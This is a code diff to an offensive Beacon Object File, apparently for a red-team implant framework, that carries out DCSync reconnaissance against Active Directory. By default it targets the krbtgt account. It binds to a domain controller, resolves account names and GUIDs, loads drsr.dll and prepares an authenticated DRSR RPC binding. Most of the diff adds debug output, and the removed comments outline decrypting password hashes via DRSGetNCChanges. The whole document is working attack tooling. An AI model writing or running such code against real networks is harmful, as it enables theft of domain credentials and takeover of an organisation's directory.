@@ -178,6 +178,8 @@ typedef ULONG (*IDL_DRSGetNCChanges_fn)(
 
 
 void go(char *args, int args_len) {
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] dcsync BOF entered\n");
+
     datap parser;
     BeaconDataParse(&parser, args, args_len);
 
@@ -186,6 +188,10 @@ void go(char *args, int args_len) {
     char *dc = BeaconDataExtract(&parser, NULL);
     int dump_all = BeaconDataInt(&parser);
 
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] args parsed: domain='%s' user='%s' dc='%s' all=%d\n",
+                 domain ? domain : "(null)", user ? user : "(null)",
+                 dc ? dc : "(null)", dump_all);
+
     /* Auto-detect domain */
     wchar_t wDomain[256] = {0};
     char aDomain[256] = {0};
@@ -193,10 +199,13 @@ void go(char *args, int args_len) {
         KERNEL32$MultiByteToWideChar(CP_UTF8, 0, domain, -1, wDomain, 256);
         MSVCRT$strncpy(aDomain, domain, 255);
     } else {
+        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] calling GetComputerNameExW...\n");
         DWORD size = 256;
-        KERNEL32$GetComputerNameExW(ComputerNameDnsDomain, wDomain, &size);
+        BOOL gnOk = KERNEL32$GetComputerNameExW(ComputerNameDnsDomain, wDomain, &size);
+        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] GetComputerNameExW returned %d, size=%u\n", gnOk, size);
         KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wDomain, -1, aDomain, 256, NULL, NULL);
     }
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] domain resolved: '%s'\n", aDomain);
 
     /* Auto-discover DC */
     wchar_t wDC[256] = {0};
@@ -205,21 +214,28 @@ void go(char *args, int args_len) {
         MSVCRT$strncpy(aDC, dc, 255);
         KERNEL32$MultiByteToWideChar(CP_UTF8, 0, dc, -1, wDC, 256);
     } else {
+        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] calling DsGetDcNameW...\n");
         void *dcInfo = NULL;
-        if (NETAPI32$DsGetDcNameW(NULL, wDomain, NULL, NULL, 0, &dcInfo) == 0 && dcInfo) {
+        DWORD dcResult = NETAPI32$DsGetDcNameW(NULL, wDomain, NULL, NULL, 0, &dcInfo);
+        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] DsGetDcNameW returned %u, dcInfo=%p\n", dcResult, dcInfo);
+        if (dcResult == 0 && dcInfo) {
             LPWSTR dcName = *(LPWSTR*)dcInfo;
+            BeaconPrintf(CALLBACK_OUTPUT, "[DBG] dcName ptr=%p\n", dcName);
             if (dcName) {
                 if (dcName[0] == L'\\' && dcName[1] == L'\\') dcName += 2;
                 MSVCRT$wcscpy(wDC, dcName);
                 KERNEL32$WideCharToMultiByte(CP_UTF8, 0, dcName, -1, aDC, 255, NULL, NULL);
             }
+            BeaconPrintf(CALLBACK_OUTPUT, "[DBG] calling NetApiBufferFree...\n");
             NETAPI32$NetApiBufferFree(dcInfo);
+            BeaconPrintf(CALLBACK_OUTPUT, "[DBG] NetApiBufferFree done\n");
         }
         if (!aDC[0]) {
             BeaconPrintf(CALLBACK_ERROR, "[!] DC auto-discovery failed. Use --dc.\n");
             return;
         }
     }
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] DC resolved: '%s'\n", aDC);
 
     /* Default target: krbtgt */
     char aUser[256] = "krbtgt";
@@ -233,8 +249,10 @@ void go(char *args, int args_len) {
                  dump_all ? "ALL USERS" : aUser, aDomain, aDC);
 
     /* ── Step 1: DsBind to validate connectivity and privileges ── */
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] calling DsBindW...\n");
     HANDLE hDs = NULL;
     DWORD dwResult = NTDSAPI$DsBindW(wDC, wDomain, &hDs);
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] DsBindW returned %u, hDs=%p\n", dwResult, hDs);
     if (dwResult != 0) {
         BeaconPrintf(CALLBACK_ERROR, "[!] DsBind failed: %u\n", dwResult);
         BeaconPrintf(CALLBACK_ERROR, "[!] Ensure you have replication rights (DS-Replication-Get-Changes)\n");
@@ -248,27 +266,32 @@ void go(char *args, int args_len) {
     /* Extract NetBIOS domain name */
     wchar_t wNetBios[64] = {0};
     {
-        /* Try to get the NetBIOS name — use the first component of the FQDN */
         int i = 0;
         while (wDomain[i] && wDomain[i] != L'.' && i < 63) {
             wNetBios[i] = wDomain[i];
             i++;
         }
         wNetBios[i] = 0;
-        /* Convert to uppercase */
         for (int j = 0; wNetBios[j]; j++) {
             if (wNetBios[j] >= L'a' && wNetBios[j] <= L'z')
                 wNetBios[j] -= 32;
         }
     }
     MSVCRT$_snwprintf(nt4Name, 512, L"%s\\%s", wNetBios, wUser);
+    {
+        char nt4Dbg[256] = {0};
+        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, nt4Name, -1, nt4Dbg, 255, NULL, NULL);
+        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] NT4 name: '%s'\n", nt4Dbg);
+    }
 
     LPCWSTR names[1] = { nt4Name };
     DS_NAME_RESULTW *crackResult = NULL;
 
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] calling DsCrackNamesW (DN)...\n");
     dwResult = NTDSAPI$DsCrackNamesW(hDs, DS_NAME_NO_FLAGS,
         DS_NT4_ACCOUNT_NAME, DS_FQDN_1779_NAME,
         1, names, (void**)&crackResult);
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] DsCrackNamesW (DN) returned %u, crackResult=%p\n", dwResult, crackResult);
 
     if (dwResult != 0 || !crackResult) {
         BeaconPrintf(CALLBACK_ERROR, "[!] DsCrackNames failed: %u\n", dwResult);
@@ -276,6 +299,7 @@ void go(char *args, int args_len) {
         return;
     }
 
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] crackResult->cItems=%u\n", crackResult->cItems);
     if (crackResult->cItems < 1 || crackResult->rItems[0].status != 0) {
         DWORD nameStatus = (crackResult->cItems > 0) ? crackResult->rItems[0].status : (DWORD)-1;
         BeaconPrintf(CALLBACK_ERROR, "[!] Name resolution failed for %s (status: %u)\n",
@@ -298,10 +322,12 @@ void go(char *args, int args_len) {
                  aUser, userDN, userDomain);
 
     /* Also resolve to GUID for DRSGetNCChanges */
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] calling DsCrackNamesW (GUID)...\n");
     DS_NAME_RESULTW *guidResult = NULL;
     dwResult = NTDSAPI$DsCrackNamesW(hDs, DS_NAME_NO_FLAGS,
         DS_NT4_ACCOUNT_NAME, DS_UNIQUE_ID_NAME,
         1, names, (void**)&guidResult);
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] DsCrackNamesW (GUID) returned %u, guidResult=%p\n", dwResult, guidResult);
 
     if (dwResult == 0 && guidResult && guidResult->cItems > 0 && guidResult->rItems[0].status == 0) {
         char guidStr[128] = {0};
@@ -309,30 +335,17 @@ void go(char *args, int args_len) {
                                       guidStr, 127, NULL, NULL);
         BeaconPrintf(CALLBACK_OUTPUT, "    GUID: %s\n", guidStr);
     }
-    if (guidResult) NTDSAPI$DsFreeNameResultW(guidResult);
+    if (guidResult) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] calling DsFreeNameResultW(guidResult)...\n");
+        NTDSAPI$DsFreeNameResultW(guidResult);
+        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] DsFreeNameResultW(guidResult) done\n");
+    }
 
     /* ── Step 3: DRSGetNCChanges ── */
-    /*
-     * DRSGetNCChanges requires constructing a DRS_MSG_GETCHGREQ_V8 struct:
-     *   - uuidDsaObjDest: our DSA GUID (can be zeros for non-DC)
-     *   - uuidInvocIdSrc: zeros
-     *   - pNC: the object's DN as a DSNAME
-     *   - usnvecFrom: {0,0,0} — from the beginning
-     *   - pUpToDateVecDest: NULL
-     *   - ulFlags: DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW
-     *              | DRS_SYNC_URGENT = 0x00000211 | 0x00000010 = ...
-     *   - cMaxObjects: 1
-     *   - cMaxBytes: 0x00a00000
-     *   - ulExtendedOp: EXOP_REPL_OBJ (6) — replicate single object
-     *   - pPartialAttrSet: list of attributes we want
-     *
-     * This requires the drsr.dll client stubs (IDL_DRSGetNCChanges).
-     *
-     * Attempt to load drsr.dll and resolve the stubs.
-     */
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] calling LoadLibraryA(\"drsr.dll\")...\n");
     HMODULE hDrsr = KERNEL32$LoadLibraryA("drsr.dll");
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] LoadLibraryA returned %p\n", hDrsr);
     if (!hDrsr) {
-        /* drsr.dll is only present on Domain Controllers or machines with RSAT */
         BeaconPrintf(CALLBACK_OUTPUT,
             "\n[!] drsr.dll not available on this host\n"
             "[*] DsBind succeeded — you HAVE replication rights\n"
@@ -347,15 +360,23 @@ void go(char *args, int args_len) {
             "    DC:     %s\n",
             aUser, userDN, userDomain, aDC);
 
+        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] calling DsFreeNameResultW(crackResult) [no drsr path]...\n");
         NTDSAPI$DsFreeNameResultW(crackResult);
+        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] calling DsUnBindW [no drsr path]...\n");
         NTDSAPI$DsUnBindW(&hDs);
+        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] cleanup done [no drsr path]\n");
         return;
     }
 
     /* Try to resolve the internal DRSR stubs */
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] resolving IDL_DRSBind...\n");
     IDL_DRSBind_fn pDRSBind = (IDL_DRSBind_fn)(void *)KERNEL32$GetProcAddress(hDrsr, "IDL_DRSBind");
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] IDL_DRSBind = %p\n", pDRSBind);
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] resolving IDL_DRSGetNCChanges...\n");
     IDL_DRSGetNCChanges_fn pDRSGetNCChanges =
         (IDL_DRSGetNCChanges_fn)(void *)KERNEL32$GetProcAddress(hDrsr, "IDL_DRSGetNCChanges");
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] IDL_DRSGetNCChanges = %p\n", pDRSGetNCChanges);
 
     if (!pDRSBind || !pDRSGetNCChanges) {
         BeaconPrintf(CALLBACK_OUTPUT,
@@ -368,44 +389,33 @@ void go(char *args, int args_len) {
 
     BeaconPrintf(CALLBACK_OUTPUT, "[+] drsr.dll loaded — DRSR stubs available\n");
 
-    /*
-     * When running ON a DC with drsr.dll stubs available:
-     *
-     * 1. Create RPC binding to target DC
-     * 2. Call IDL_DRSBind with our client DSA UUID and extensions
-     * 3. Call IDL_DRSGetNCChanges with EXOP_REPL_OBJ for the target user
-     * 4. Parse the returned REPLENTINFLIST for password attributes
-     * 5. Decrypt unicodePwd and supplementalCredentials using the session key
-     *
-     * The structs involved are massive (DRS_MSG_GETCHGREQ_V8 is ~200 bytes,
-     * DRS_MSG_GETCHGREPLY_V6 contains linked lists of REPLENTINFLIST, each
-     * containing ATTRBLOCK with ATTR entries).
-     *
-     * This is implemented by mimikatz in kuhl_m_lsadump_dcsync.c (~2000 lines).
-     * For the BOF, we defer to the assembly module for the actual extraction.
-     */
-
     /* Create our own RPC binding for the DRSR calls */
     RPC_CSTR stringBinding = NULL;
     RPC_BINDING_HANDLE hRpc = NULL;
 
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] calling RpcStringBindingComposeA...\n");
     RPC_STATUS rpcStatus = RPCRT4$RpcStringBindingComposeA(
         (RPC_CSTR)"e3514235-4b06-11d1-ab04-00c04fc2dcd2",
         (RPC_CSTR)"ncacn_ip_tcp",
         (RPC_CSTR)aDC,
         NULL, NULL, &stringBinding);
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] RpcStringBindingComposeA returned %u\n", rpcStatus);
 
     if (rpcStatus == RPC_S_OK) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] calling RpcBindingFromStringBindingA...\n");
         rpcStatus = RPCRT4$RpcBindingFromStringBindingA(stringBinding, &hRpc);
+        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] RpcBindingFromStringBindingA returned %u\n", rpcStatus);
         RPCRT4$RpcStringFreeA(&stringBinding);
     }
 
     if (rpcStatus == RPC_S_OK) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] calling RpcBindingSetAuthInfoExA...\n");
         rpcStatus = RPCRT4$RpcBindingSetAuthInfoExA(
             hRpc, (RPC_CSTR)aDC,
             RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
             RPC_C_AUTHN_GSS_NEGOTIATE,
             NULL, 0, NULL);
+        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] RpcBindingSetAuthInfoExA returned %u\n", rpcStatus);
     }
 
     if (rpcStatus != RPC_S_OK) {
@@ -423,9 +433,13 @@ void go(char *args, int args_len) {
         aUser, aDomain, aDC);
 
     /* Cleanup */
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] cleanup: RpcBindingFree...\n");
     if (hRpc) RPCRT4$RpcBindingFree(&hRpc);
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] cleanup: DsFreeNameResultW...\n");
     NTDSAPI$DsFreeNameResultW(crackResult);
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] cleanup: DsUnBindW...\n");
     NTDSAPI$DsUnBindW(&hDs);
 
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] all cleanup done\n");
     BeaconPrintf(CALLBACK_OUTPUT, "\n[+] DCSync reconnaissance complete\n");
 }
